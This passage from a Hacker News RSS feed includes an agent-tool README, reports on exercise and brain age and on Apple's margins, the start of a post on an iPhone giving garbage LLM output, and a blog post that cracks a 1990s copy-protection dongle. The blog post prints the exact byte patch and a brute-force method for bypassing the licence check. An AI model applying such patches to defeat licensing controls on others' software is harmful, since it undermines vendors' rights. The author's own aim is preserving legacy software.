<li><code>/add-telegram</code> - Add Telegram as channel. Should give the user option to replace WhatsApp or add as additional channel. Also should be possible to add it as a control channel (where it can trigger actions) or just a channel that can be used in actions triggered elsewhere</li>
<li><code>/add-slack</code> - Add Slack</li>
<li><code>/add-discord</code> - Add Discord</li>
</ul>
<p dir="auto"><strong>Container Runtime</strong></p>
<ul dir="auto">
<li><code>/convert-to-docker</code> - Replace Apple Container with Docker (unlocks Linux)</li>
</ul>
<p dir="auto"><strong>Platform Support</strong></p>
<ul dir="auto">
<li><code>/setup-windows</code> - Windows via WSL2 + Docker</li>
</ul>
<p dir="auto"><strong>Session Management</strong></p>
<ul dir="auto">
<li><code>/add-clear</code> - Add a <code>/clear</code> command that compacts the conversation (summarizes context while preserving critical information in the same session). Requires figuring out how to trigger compaction programmatically via the Claude Agent SDK.</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Requirements</h2><a id="user-content-requirements" aria-label="Permalink: Requirements" href="#requirements"></a></p>
<ul dir="auto">
<li>macOS Tahoe (26) or later - runs great on Mac Mini</li>
<li>Node.js 20+</li>
<li><a href="https://claude.ai/download" rel="nofollow">Claude Code</a></li>
<li><a href="https://github.com/apple/container">Apple Container</a></li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Architecture</h2><a id="user-content-architecture" aria-label="Permalink: Architecture" href="#architecture"></a></p>
<div data-snippet-clipboard-copy-content="WhatsApp (baileys) --> SQLite --> Polling loop --> Container (Claude Agent SDK) --> Response"><pre><code>WhatsApp (baileys) --&gt; SQLite --&gt; Polling loop --&gt; Container (Claude Agent SDK) --&gt; Response
</code></pre></div>
<p dir="auto">Single Node.js process. Agents execute in isolated Linux containers with mounted directories. IPC via filesystem. No daemons, no queues, no complexity.</p>
<p dir="auto">Key files:</p>
<ul dir="auto">
<li><code>src/index.ts</code> - Main app: WhatsApp connection, routing, IPC</li>
<li><code>src/container-runner.ts</code> - Spawns agent containers</li>
<li><code>src/task-scheduler.ts</code> - Runs scheduled tasks</li>
<li><code>src/db.ts</code> - SQLite operations</li>
<li><code>groups/*/CLAUDE.md</code> - Per-group memory</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><strong>Why WhatsApp and not Telegram/Signal/etc?</strong></p>
<p dir="auto">Because I use WhatsApp. Fork it and run a skill to change it. That's the whole point.</p>
<p dir="auto"><strong>Why Apple Container instead of Docker?</strong></p>
<p dir="auto">Lightweight, fast, and built into macOS. Requires macOS Tahoe and runs great on a Mac Mini. Contribute a skill to convert to Docker if you want Docker.</p>
<p dir="auto"><strong>Can I run this on Linux?</strong></p>
<p dir="auto">Yes. Run Claude Code and say "make this run on Linux." ~30 min of back-and-forth and it'll work. When you're done, ask Claude to create a skill explaining how to make it work on Linux, then contribute the skill back to the project.</p>
<p dir="auto"><strong>Is this secure?</strong></p>
<p dir="auto">Agents run in containers, not behind application-level permission checks. They can only access explicitly mounted directories. You should still review what you're running, but the codebase is small enough that you actually can. See <a href="https://github.com/gavrielc/nanoclaw/blob/main/docs/SECURITY.md">docs/SECURITY.md</a> for the full security model.</p>
<p dir="auto"><strong>Why no configuration files?</strong></p>
<p dir="auto">We don't want configuration sprawl. Every user should customize it to so that the code matches exactly what they want rather than configuring a generic system. If you like having config files, tell Claude to add them.</p>
<p dir="auto"><strong>How do I debug issues?</strong></p>
<p dir="auto">Ask Claude Code. "Why isn't the scheduler running?" "What's in the recent logs?" "Why did this message not get a response?" That's the AI-native approach.</p>
<p dir="auto"><strong>Why isn't the setup working for me?</strong></p>
<p dir="auto">I don't know. Run <code>claude</code>, then run <code>/debug</code>. If claude finds an issue that is likely affecting other users, open a PR to modify the setup SKILL.md.</p>
<p dir="auto"><strong>What changes will be accepted into the codebase?</strong></p>
<p dir="auto">Security fixes, bug fixes, and clear improvements to the base configuration. That's it.</p>
<p dir="auto">Everything else (new capabilities, OS compatibility, hardware support, enhancements) should be contributed as skills.</p>
<p dir="auto">This keeps the base system minimal and lets every user customize their installation without inheriting features they don't want.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto">MIT</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MRI scans show exercise can make the brain look younger (112 pts)]]></title>
            <link>https://www.sciencedaily.com/releases/2026/01/260121034130.htm</link>
            <guid>46849630</guid>
            <pubDate>Sun, 01 Feb 2026 21:37:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.sciencedaily.com/releases/2026/01/260121034130.htm">https://www.sciencedaily.com/releases/2026/01/260121034130.htm</a>, See on <a href="https://news.ycombinator.com/item?id=46849630">Hacker News</a></p>
<div id="readability-page-1" class="page"><p id="first">Looking after your brain is something that happens over many years, and new findings from the AdventHealth Research Institute point to an encouraging option. Researchers report that sticking with a consistent aerobic exercise routine may help the brain remain biologically younger. This effect could support clearer thinking, better memory, and overall mental well-being.</p><div id="text">
<p>The research showed that adults who committed to a full year of aerobic exercise had brains that appeared almost one year younger than those of participants who did not change how active they were.</p>
<p><strong>Measuring Brain Age With MRI</strong></p>
<p>Published in the <em>Journal of Sport and Health Science</em>, the study examined whether regular aerobic exercise could slow or even reverse what scientists call "brain age." Brain age is estimated using magnetic resonance imaging (MRI) and reflects how old the brain appears compared to a person's actual age. A higher brain-predicted age difference (brain-PAD) means the brain looks older, and earlier studies have linked this measure to weaker physical and cognitive performance and a higher risk of death.</p>
<p>"We found that a simple, guideline-based exercise program can make the brain look measurably younger over just 12 months," said Dr. Lu Wan, lead author and data scientist at the AdventHealth Research Institute. "Many people worry about how to protect their brain health as they age. Studies like this offer hopeful guidance grounded in everyday habits. These absolute changes were modest, but even a one-year shift in brain age could matter over the course of decades."</p>
<p><strong>Inside the Year-Long Exercise Trial</strong></p>
<p>The clinical trial included 130 healthy adults between the ages of 26 and 58. Participants were randomly assigned to either a moderate-to-vigorous aerobic exercise group or a usual-care control group. Those in the exercise group completed two supervised 60-minute workout sessions each week in a laboratory and added home-based exercise to reach roughly 150 minutes of aerobic activity per week. This schedule matched the physical activity guidelines set by the American College of Sports Medicine.</p>


<p>Researchers measured brain structure using MRI scans and assessed cardiorespiratory fitness through peak oxygen uptake (VO2peak) at the start of the study and again after 12 months.</p>
<p><strong>Exercise Linked to a Younger Looking Brain</strong></p>
<p>After one year, clear differences emerged between the two groups. Participants who exercised showed a measurable decrease in brain age, while those in the control group showed a slight increase. On average, the exercise group saw their brain-PAD drop by about 0.6 years, meaning their brains looked younger at the end of the study. The control group's brains appeared about 0.35 years older, a change that was not statistically significant. When compared directly, the gap between the two groups was close to one full year in favor of the exercise group.</p>
<p>"Even though the difference is less than a year, prior studies suggest that each additional 'year' of brain age is associated with meaningful differences in later-life health," said Dr. Kirk I. Erickson, senior author of the study and a neuroscientist and director at AdventHealth Research Institute and the University of Pittsburgh. "From a lifespan perspective, nudging the brain in a younger direction in midlife could be very important."</p>
<p><strong>Why Exercise May Affect Brain Aging</strong></p>
<p>To better understand why exercise influenced brain age, the research team looked at several possible factors. These included changes in physical fitness, body composition, blood pressure, and levels of brain-derived neurotrophic factor (BDNF), a protein that supports brain plasticity. Although fitness levels clearly improved with exercise, none of these factors statistically explained the reduction in brain-PAD seen in the trial.</p>


<p>"That was a surprise," Wan noted. "We expected improvements in fitness or blood pressure to account for the effect, but they didn't. Exercise may be acting through additional mechanisms we haven't captured yet, such as subtle changes in brain structure, inflammation, vascular health or other molecular factors."</p>
<p><strong>Focusing on Midlife for Long-Term Benefits</strong></p>
<p>Many studies on exercise and brain health focus on older adults, after age-related changes have already become more pronounced. This trial took a different approach by targeting people in early to mid-adulthood, when brain changes are harder to detect but prevention may offer greater benefits over time.</p>
<p>"Intervening in the 30s, 40s and 50s gives us a head start," Erickson said. "If we can slow brain aging before major problems appear, we may be able to delay or reduce the risk of later-life cognitive decline and dementia."</p>
<p><strong>What the Findings Mean Going Forward</strong></p>
<p>The authors caution that the study involved healthy, relatively well-educated volunteers and that the changes in brain age were modest. They note that larger studies and longer follow-up periods are needed to learn whether these reductions in brain-PAD lead to lower risks of stroke, dementia, or other brain-related diseases.</p>
<p>"People often ask, 'Is there anything I can do now to protect my brain later?'" Erickson said. "Our findings support the idea that following current exercise guidelines -- 150 minutes per week of moderate-to-vigorous aerobic activity -- may help keep the brain biologically younger, even in midlife."</p>
<p><strong>About the Researchers and Funding</strong></p>
<p>Dr. Lu Wan has been a Data Scientist at AdventHealth in Orlando, Florida, since June 2024. Her previous roles include Data Engineer at the University of Pittsburgh and Biomedical Engineer at Spaulding Rehabilitation Hospital. She holds a PhD, completed graduate research training at the University of Florida, and studies brain aging, physical activity, and cognitive health across adulthood. She is affiliated with the AdventHealth Neuroscience Institute, a nationally recognized center for brain research and care.</p>
<p>Dr. Kirk I. Erickson is the Director of Translational Neuroscience and the Mardian J. Blair Endowed Chair of Neuroscience at the AdventHealth Research Institute. He earned his Ph.D. from the University of Illinois at Urbana-Champaign and completed postdoctoral training at the Beckman Institute. Previously a Professor at the University of Pittsburgh, his work focuses on how physical activity affects brain health across the lifespan. He has published more than 350 articles, led major NIH-funded trials, and served on the U.S. Physical Activity Guidelines Advisory Committee.</p>
<p>The study was funded by the National Institutes of Health and the National Heart, Lung, and Blood Institute (Grant P01 HL040962) awarded to Peter J. Gianaros and Kirk I. Erickson.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Margin Call (151 pts)]]></title>
            <link>https://asymco.com/2026/02/01/margin-call-3/</link>
            <guid>46849588</guid>
            <pubDate>Sun, 01 Feb 2026 21:33:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://asymco.com/2026/02/01/margin-call-3/">https://asymco.com/2026/02/01/margin-call-3/</a>, See on <a href="https://news.ycombinator.com/item?id=46849588">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>While the commentariat assumes the worst, Apple delivers the best.</p>



<p>Last quarter Apple delivered a gross margin of 48.2%. This was above the high end of their guidance range and up 100 basis points sequentially. Management commented that this was “driven by favorable mix and leverage.”</p>



<p>Further, products gross margin was 40.7%, up 450 basis points sequentially, driven by favorable mix and leverage. Services gross margin was 76.5%, up 120 basis points sequentially, driven by mix.</p>



<p>This performance is even more astonishing considering the history shown below. Apple is quite simply, delivering at the highest gross and net margins in its history. </p>



<figure><a href="https://asymco.com/wp-content/uploads/2026/02/image-5.png"><img fetchpriority="high" decoding="async" width="620" height="539" src="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png" alt="Line graph depicting Apple's profit margins over time, including Gross Margin, Operating Margin, Net Margin, Product Margin, and Services Margin percentages, with data spanning from 2010 to 2023." srcset="https://asymco.com/wp-content/uploads/2026/02/image-5-620x539.png 620w, https://asymco.com/wp-content/uploads/2026/02/image-5-440x383.png 440w, https://asymco.com/wp-content/uploads/2026/02/image-5.png 731w" sizes="(max-width: 620px) 100vw, 620px"></a></figure>



<p>Note that the graph actually projects forward one quarter because we have the following guidance: “We expect gross margin to be between 48-49%.” The graph reflects the high end of this guidance range.</p>



<p>So what’s going on?  Especially as a drumbeat of constant doom is being broadcast by pundits. The conference call itself seemed to be dedicated to margins. It became what I call the Margin Call. </p>



<p>Amit Daryanani, the first questioning analyst, specifically kicked off with the following:</p>



<blockquote>
<p>“there is a lot of focus on the impact of memory to host the companies, and I would love to kind of get your perspective when you are first guiding gross margins up into March. Talk about, a, your comfort in securing the bit that you need for shipment and b, how do we think about memory inflation flowing through Apple’s model over time?”</p>
</blockquote>



<p>Tim Cook answered: </p>



<blockquote>
<p>We are currently constrained, and at this point, it is difficult to predict when supply and demand will balance. The constraints that we have are driven by the availability of the advanced nodes that our SoCs are produced on. And at this time, we are seeing less flexibility in the supply chain than normal, partly because of our increased demand that I just spoke about. From a memory point of view, to answer your question, <strong>memory had a minimal impact on Q1. So the December gross margin. We do expect it to be a bit more of an impact on the Q2 gross margin, and that was comprehended in the outlook of 48 to 49% that Kevin gave earlier</strong>.</p>
</blockquote>



<p>what Apple is saying is that they are constrained by production of silicon but not of memory. They do see some impact in the future but that is included in a guidance of <strong>margin expansion</strong>. </p>



<p>Analysts still could not believe this, the following exchange soon followed:</p>



<blockquote>
<p><strong>Ben Reitzes</strong>: So the next question is on gross margin. I am pretty shocked I gotta hand it to you, Tim. I am, you know, that you are able to do 48 to 49. What is really going on there? How are you doing that with this memory, the NAND prices? Is it due to mix that there is a good less hardware and more services? Services and services margins are going up. How are you doing it to keep it at 48 to 49?</p>



<p><strong>Kevan Parekh</strong>: Yeah, Ben. This is Kevin. [] Let me start maybe by just reflecting on the Q1 gross margin. I think we talked about the fact that we landed at 48.2%, so just above the high end of the range we provided, [], on the last call. [] if you look at that performance, [], we were up 100 basis points sequentially. We talked about the fact that we had favorable mix. [], as you know, when we have a good product cycle, strong price cycle we are seeing for iPhone, that does lend itself to a bit more favorable opportunity on the [] leverage side.</p>



<p>So we are having a strong iPhone cycle as Tim outlined. And so that also translates itself. So we talked about products sequentially went up by 450 basis points. So I think, in general, I think we are just seeing, [], favorable mix dynamics as well. [], service continues to contribute as well. That business is growing, [], double digits, so that also is a contributor. And I think that, [], if you looked at our guidance, [], we are providing a similar range to where we reported in December. There are going to be a few puts and takes. [], we do expect to see favorable mix in the services.</p>



<p>As you know, when we move from Q1 to Q2, that tends to be the case, and that is partly offset by a seasonal loss leverage. So there will be puts and takes, but again, we feel pretty good about the guide of 48 to 49%, which is similar to the range we reported in December.</p>
</blockquote>



<p>Still not enough. Two more questions followed on margin. I will quote one here.  </p>



<blockquote>
<p><strong>Aaron Rakers</strong>: Yep. And then as a quick follow-up, you know, kind of tied to memory, maybe not so much, but part of this current generation iPhone cycle is you clearly deepened some of your own internal silicon capabilities on the device. I am curious if that if we should think about that as a lever and maybe a supportive factor to gross margin that might be underappreciated and any thoughts on where we go from here as far as continual opportunities of internalizing your own silicon? Thank you.</p>



<p><strong>Timothy D. Cook</strong>: Yeah. I will let Kevin talk about the gross margin. But in terms of the product, which is at the heart of what we think about in the user, Apple silicon has just been an incredible game changer for us. Starting with iPhone and then on iPad and, of course, the Mac as of a few years ago. And so we believe it is a game changer and a major advantage.</p>



<p><strong>Kevan Parekh</strong>: Yeah. And as far as impact on gross margin, yeah, we have been, as you know, investing in core technologies like our own silicon and our own modem. And certainly, while those do provide opportunities for cost savings and can be plugged in margins, they also importantly provide, [], the differentiation that is really important for our products as well and us more control of our roadmap. So I think there is a lot of strategic value to it, but also we are seeing, [], investments in our core technologies impacting, [], gross margin in a positive way.</p>
</blockquote>



<p>After all this, the financial commentariat continues to assume that Apple will be hit with margin pressure from memory and that has presumably been affecting the share price since the call.</p>



<p>Well, we’ve seen all this before. Before the great memory crisis Apple was going to be constrained by tariffs, by China, by developer dissatisfaction, by AI, by regulators, etc.</p>



<p>The feeling one gets is that Apple is always navigating through a minefield of pitfalls and gotchas. The opposite is true. It’s highly likely that Apple has sufficient leverage which increases its access to supply and that everyone is keen to work with the company. Leverage comes from scale, from lead time, from vertical integration and from engineering. Management is saying as much. Indeed, the evidence of leverage across the supply chain and over the entire ecosystem and economy is evident in its margin expansion story told in the graph above. </p>




</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Defeating a 40-year-old copy protection dongle (732 pts)]]></title>
            <link>https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle</link>
            <guid>46849567</guid>
            <pubDate>Sun, 01 Feb 2026 21:30:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle">https://dmitrybrant.com/2026/02/01/defeating-a-40-year-old-copy-protection-dongle</a>, See on <a href="https://news.ycombinator.com/item?id=46849567">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-2557">
	
	<!-- .entry-header -->

	<div>
		<p><img decoding="async" src="https://dmitrybrant.com/images/20260105204922.jpg" alt="image"></p>
<p>That’s right — this little device is what stood between me and the ability to run an <em>even older</em> piece of software that I recently unearthed during an expedition of software archaeology.</p>
<p>For a bit more background, I was recently involved in helping a friend’s accounting firm to move away from using an <em>extremely</em> legacy software package that they had locked themselves into using for the last four decades.</p>
<p>This software was built using a programming language called <a href="https://en.wikipedia.org/wiki/IBM_RPG">RPG</a> (“Report Program Generator”), which is older than COBOL (!), and was used with IBM’s midrange computers such as the System/3, System/32, and all the way up to the AS/400. Apparently, RPG was subsequently ported to MS-DOS, so that the same software tools built with RPG could run on personal computers, which is how we ended up here.</p>
<p>This accounting firm was actually using a Windows 98 computer (yep, in 2026), and running the RPG software inside a DOS console window. And it turned out that, in order to run this software, it requires a special hardware copy-protection dongle to be attached to the computer’s parallel port! This was a relatively common practice in those days, particularly with “enterprise” software vendors who wanted to protect their very important™ software from unauthorized use.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/20260105204921.jpg" alt="image"></p>
<p>Sadly, most of the text and markings on the dongle’s label has been worn or scratched off, but we can make out several clues:</p>
<ul>
<li>The words “Stamford, CT”, and what’s very likely the logo of a company called “Software Security Inc”. The only evidence for the existence of this company is this record of them exhibiting their wares at <a href="https://history.siggraph.org/exhibitor/software-security-inc/">SIGGRAPH conferences</a> in the early 1990s, as well as several <a href="https://patentimages.storage.googleapis.com/e6/69/0e/9f00041c0a3840/US5337357.pdf">patents</a> issued to them, relating to software protection.</li>
<li>A word that seems to say “RUNTIME”, which will become clear in a bit.</li>
</ul>
<p>My first course of action was to take a disk image of the Windows 98 PC that was running this software, and get it running in an emulator, so that we could see what the software actually does, and perhaps export the data from this software into a more modern format, to be used with modern accounting tools. But of course all of this requires the hardware dongle; none of the accounting tools seem to work without it plugged in.</p>
<p>Before doing anything, I looked through the disk image for any additional interesting clues, and found plenty of fascinating (and archaeologically significant?) stuff:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/w98rpg.png" alt="image"></p>
<ul>
<li>We’ve got a compiler for the RPG II language (excellent!), made by a company called Software West Inc.</li>
<li>Even better, there are <em>two versions</em> of the RPG II compiler, released on various dates in the 1990s by Software West.</li>
<li>We’ve got the complete source code of the accounting software, written in RPG. It looks like the full accounting package consists of numerous RPG modules, with a gnarly combination of DOS batch files for orchestrating them, all set up as a “menu” system for the user to navigate using number combinations. Clearly the author of this accounting system was originally an IBM mainframe programmer, and insisted on bringing those skills over to DOS, with mixed results.</li>
</ul>
<p>I began by playing around with the RPG compiler in isolation, and I learned very quickly that it’s the RPG compiler itself that requires the hardware dongle, and then the compiler automatically injects the same copy-protection logic into any executables it generates. This explains the text that seems to say “RUNTIME” on the dongle.</p>
<p>The compiler consists of a few executable files, notably <code>RPGC.EXE</code>, which is the compiler, and <code>SEU.EXE</code>, which is a source editor (“Source Entry Utility”). Here’s what we get when we launch SEU without the dongle, after a couple of seconds:</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu1.png" alt="image"></p>
<p>A bit rude, but this gives us an important clue: this program must be trying to communicate over the parallel port over the course of a few seconds (which could give us an opportunity to pause it for debugging, and see what it’s doing during that time), and then exits with a message (which we can now find in a disassembly of the program, and trace how it gets there).</p>
<p>A great tool for disassembling executables of this vintage is <a href="https://github.com/uxmal/reko">Reko</a>. It understands 16-bit real mode executables, and even attempts to decompile them into readable C code that corresponds to the disassembly.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg3.png" alt="image"></p>
<p>And so, looking at the decompiled/disassembled code in Reko, I expected to find <code>in</code> and <code>out</code> instructions, which would be the telltale sign of the program trying to communicate with the parallel port through the PC’s I/O ports. However… I didn’t see an <code>in</code> or <code>out</code> instruction anywhere! But then I noticed something: Reko disassembled the executable into two “segments”: <code>0800</code> and <code>0809</code>, and I was only looking at segment <code>0809</code>.</p>
<p><img decoding="async" src="https://dmitrybrant.com/images/rekorpg2.png" alt="image"></p>
<p>If we look at segment <code>0800</code>, we see the smoking gun: <code>in</code> and <code>out</code> instructions, meaning that the copy-protection routine is definitely here, and best of all, the entire code segment is a mere 0x90 bytes, which suggests that the entire routine should be pretty easy to unravel and understand. For some reason, Reko was not able to decompile this code into a C representation, but it still produced a disassembly, which will work just fine for our purposes. Maybe this was a primitive form of obfuscation from those early days, which is now confusing Reko and preventing it from associating this chunk of code with the rest of the program… who knows.</p>
<p>Here is a GitHub Gist with the <a href="https://gist.github.com/dbrant/1d1a9ba2a2a41d5ba7be50ccb3d36d6c">disassembly of this code</a>, along with my annotations and notes. My x86 assembly knowledge is a little rusty, but here is the gist of what this code does:</p>
<ul>
<li>It’s definitely a single self-contained routine, intended to be called using a “far” <code>CALL</code> instruction, since it returns with a <code>RETF</code> instruction.</li>
<li>It begins by detecting the address of the parallel port, by reading the <a href="https://wiki.osdev.org/Memory_Map_(x86)#BIOS_Data_Area_(BDA)">BIOS data area</a>. If the computer has more than one parallel port, the dongle must be connected to the <em>first</em> parallel port (LPT1).</li>
<li>It performs a loop where it writes values to the data register of the parallel port, and then reads the status register, and accumulates responses in the <code>BH</code> and <code>BL</code> registers.</li>
<li>At the end of the routine, the “result” of the whole procedure is stored in the <code>BX</code> register (<code>BH</code> and <code>BL</code> together), which will presumably be “verified” by the caller of the routine.</li>
<li>Very importantly, there doesn’t seem to be any “input” into this routine. It doesn’t pop anything from the stack, nor does it care about any register values passed into it. Which can only mean that the result of this routine is <em>completely constant</em>! No matter what complicated back-and-forth it does with the dongle, the result of this routine should always be the same.</li>
</ul>
<p>With the knowledge that this routine must exit with some magic value stored in <code>BX</code>, we can now patch the first few bytes of the routine to do just that! Not yet knowing which value to put in <code>BX</code>, let’s start with 1234:</p>
<pre><code>BB 34 12       MOV BX, 1234h
CB             RETF
</code></pre>
<p>Only the first four bytes need patching — set <code>BX</code> to our desired value, and get out of there. Running the patched executable with these new bytes still fails (expectedly) with the same message of “No dongle, no edit”, but it fails immediately, instead of after several seconds of talking to the parallel port. Progress!</p>
<p>Stepping through the disassembly more closely, we get another major clue: The only value that <code>BH</code> can be at the end of the routine is 76h. So, our total value for the magic number in <code>BX</code> must be of the form 76xx. In other words, only the <code>BL</code> value remains unknown:</p>
<pre><code>BB __ 76       MOV BX, 76__h
CB             RETF
</code></pre>
<p>Since <code>BL</code> is an 8-bit register, it can only have 256 possible values. And what do we do when we have 256 combinations to try? Brute force it! I whipped up a script that plugs a value into that particular byte (from 0 to 255) and programmatically launches the executable in DosBox, and observes the output. Lo and behold, it worked! The brute forcing didn’t take long at all, because the correct number turned out to be… <em>6</em>. Meaning that the total magic number in <code>BX</code> should be 7606h:</p>
<pre><code>BB 06 76       MOV BX, 7606h
CB             RETF
</code></pre>
<p><img decoding="async" src="https://dmitrybrant.com/images/seu2.png" alt="image"></p>
<p>Bingo!<br>
And then, proceeding to examine the other executable files in the compiler suite, the parallel port routine turns out to be <em>exactly the same</em>. All of the executables have the exact same copy protection logic, as if it was rubber-stamped onto them. In fact, when the compiler (<code>RPGC.EXE</code>) compiles some RPG source code, it seems to copy the parallel port routine from itself into the compiled program. That’s right: the patched version of the compiler will produce executables with the same patched copy protection routine! Very convenient.</p>
<p>I must say, this copy protection mechanism seems a bit… simplistic? A hardware dongle that just passes back a constant number? Defeatable with a four-byte patch? Is this really worthy of a patent? But who am I to pass judgment. It’s possible that I haven’t fully understood the logic, and the copy protection will somehow re-surface in another way. It’s also possible that the creators of the RPG compiler (Software West, Inc) didn’t take proper advantage of the hardware dongle, and used it in a way that is so easily bypassed.</p>
<p>In any case, Software West’s RPG II compiler is now free from the constraint of the parallel port dongle! And at some point soon, I’ll work on purging any PII from the compiler directories, and make this compiler available as an artifact of computing history. It doesn’t seem to be available anywhere else on the web. If anyone reading this was associated with Software West Inc, feel free to get in touch — I have many questions!</p>
	</div><!-- .entry-content -->

	
	<!-- .entry-footer -->

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[My thousand dollar iPhone can't do math (381 pts)]]></title>
            <link>https://journal.rafaelcosta.me/my-thousand-dollar-iphone-cant-do-math/</link>
            <guid>46849258</guid>
            <pubDate>Sun, 01 Feb 2026 20:51:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://journal.rafaelcosta.me/my-thousand-dollar-iphone-cant-do-math/">https://journal.rafaelcosta.me/my-thousand-dollar-iphone-cant-do-math/</a>, See on <a href="https://news.ycombinator.com/item?id=46849258">Hacker News</a></p>
<div id="readability-page-1" class="page"><div role="main">
	<article>
		<section>
				<h2 id="tldr">TL;DR:</h2><p>My iPhone 16 Pro Max produces garbage output when running MLX LLMs. An iPhone 15 Pro runs the same code perfectly. A MacBook Pro also runs the same code perfectly. The tensor outputs on the 16 show numerical values an order of magnitude wrong. I suspect it points to a hardware defect in the Neural Engine or some other ML-needed system.</p><p>It was a PITA to debug, but at least I got a blog post out of it.</p><h2 id="how-did-i-get-there">How did I get there?</h2><p>This was supposed to be a simple, unwinding-time project.</p><p>For the past few months I've been working on a <s>Clawdbot</s> Moltbot clone that I've been calling Schmidt. It basically does the same kind of thing but with a custom chat UI instead of using Telegram, WhatsApp or other "I-can't-afford-to-be-banned-from" Service. This project has been consuming early days and late nights, so, to unwind, I decided that it may be a good idea to do something simpler. Since I recently subscribed to MiniMax M2.1, I thought I would do what many do and build a simple expense tracking app to test out the model.</p><p>The core functionality is simple: </p><ul><li>Automatically, upon each payment, add the expense to my app</li><li>Update an Apple Watch complication with the % of my monthly budget spent</li><li>Categorize the purchase for later analysis</li></ul><p>This all comes from being basically orphaned by Nubank's amazing native app (since replaced by a less-full-featured Flutter version).</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp" alt="" loading="lazy" width="752" height="564" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp 600w, https://journal.rafaelcosta.me/content/images/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp 752w" sizes="(min-width: 720px) 720px"><figcaption><span>Something like that, I can't find the original complication itself. Apparently, this was designed by </span><a href="https://dribbble.com/gneumann?ref=journal.rafaelcosta.me" rel="contact"><span>Guilherme Neumann</span></a><span>&nbsp;(according to their Dribbble)</span></figcaption></figure><p>Integrating with Shortcuts is manual, but reliable. Within 15 minutes I had a version of the app that could register purchases. The Apple Watch complication, the main goal, can come later. I'd rather get the classification feature, which should be easy, done quickly – so I figured.</p><h2 id="apple-intelligence">Apple Intelligence</h2><p>Given the new LLM-bonanza we've been living through, it's no surprise that Apple has their own set of APIs developers such as me can use. Reading up on the documentation, it's a matter of checking for the availability of the feature and then asking the model to either reply to a textual query or, in my case, categorize a request.</p><p>MiniMax raced through it in a single prompt and then I ran it on my iPhone. First expense was a purchase at a shop called "Kasai Kitchin", classified as... <code>unknown</code>.<br>Weird.</p><p>Checking the logs, it was clear: the model support was downloading. The feature hadn't been enabled. Again, weird. I should have it on. Anyway, I go into settings, do the weird dance of toggling it on and off – sadly, that's not surprising on Apple's services. Maybe my Settings.app got stuck in a weird state, who knows? – and wait for it to download.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-01.14.46.png" alt="" loading="lazy" width="1320" height="971" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-28-at-01.14.46.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-28-at-01.14.46.png 1000w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-01.14.46.png 1320w" sizes="(min-width: 720px) 720px"></figure><p>After 4h I realized it was not going anywhere. Looking it up, it seems that many have the same issue (<a href="https://discussions.apple.com/thread/255822364?answerId=261482678022&amp;sortBy=rank&amp;page=12&amp;ref=journal.rafaelcosta.me#261482678022">this</a> thread shows 12 pages of frustrated users). Again, not a surprise for Apple's services recently.</p><p>Oh well, time to give up on the Apple Intelligence approach. Let's move on to the next one.</p><h2 id="mlx-llm">MLX LLM</h2><p>Well, the iOS framework engineers don't seem to be the only engineers at Apple capable of coming up with Machine Learning APIs in Swift. Apparently, there's a whole separate way of doing it – with models downloaded to your app. Not great for the user's storage, but great for me!</p><p>Again, MiniMax does it in a heartbeat, specially after being given documentation and one or two Medium posts. Time to run on my iPhone and... gibberish.</p><p>The CPU spins to 100% and the model starts generating. But it's all gibberish. And no "stop" token is generated, so this goes on for long.</p><figure><img src="https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-02.09.49.png" alt="" loading="lazy" width="2000" height="605" srcset="https://journal.rafaelcosta.me/content/images/size/w600/2026/01/Screenshot-2026-01-28-at-02.09.49.png 600w, https://journal.rafaelcosta.me/content/images/size/w1000/2026/01/Screenshot-2026-01-28-at-02.09.49.png 1000w, https://journal.rafaelcosta.me/content/images/size/w1600/2026/01/Screenshot-2026-01-28-at-02.09.49.png 1600w, https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-02.09.49.png 2322w" sizes="(min-width: 720px) 720px"><figcaption><span>"What is 2+2?" apparently "Applied.....*_dAK[...]" according to my iPhone</span></figcaption></figure><p>At this point, the only explanation is: I'm completely incompetent and can't even get a simple "ready made" framework to execute what I want. Or, rather, <strong>MiniMax is</strong>! The good thing about offloading your work to an LLM is that you can blame it for your shortcomings. Time to get my hands dirty and do it myself, typing code on my keyboard, like the ancient Mayan and Aztec programmers probably did.</p><h2 id="my-own-mlx-implementation">My own MLX implementation</h2><div><p>I went back to the documentation, to the Medium posts and, much to my surprise: MiniMax had followed it to the letter. Even went back to some deprecated methods of generation and it also was gibberish. And now there's no one to blame, but myself. I go to work everyday and this impostor-syndrome inducing problem silently consumes me. </p><p>After 3 days of trying to 